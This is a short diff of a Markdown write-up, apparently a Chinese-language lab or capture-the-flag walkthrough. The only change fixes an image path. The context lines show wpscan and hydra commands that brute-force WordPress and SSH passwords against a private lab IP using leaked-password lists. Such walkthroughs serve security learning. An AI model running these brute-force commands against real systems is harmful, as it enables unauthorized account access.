@@ -105,7 +105,7 @@ wpscan --url http://10.204.219.237/wordpress -U pp -P /home/neon/Desktop/Common-
  hydra -L pp -P /home/neon/Desktop/Leaked-Databases/rockyou-20.txt 10.204.219.237 ssh -t 16
 ```
 
-    ![](images/2026-07-02-20-37-52-image.png)
+![](images/2026-07-06-18-20-45-2026-07-02-20-37-52-image.png)
 
 ### 出现一个密码
 
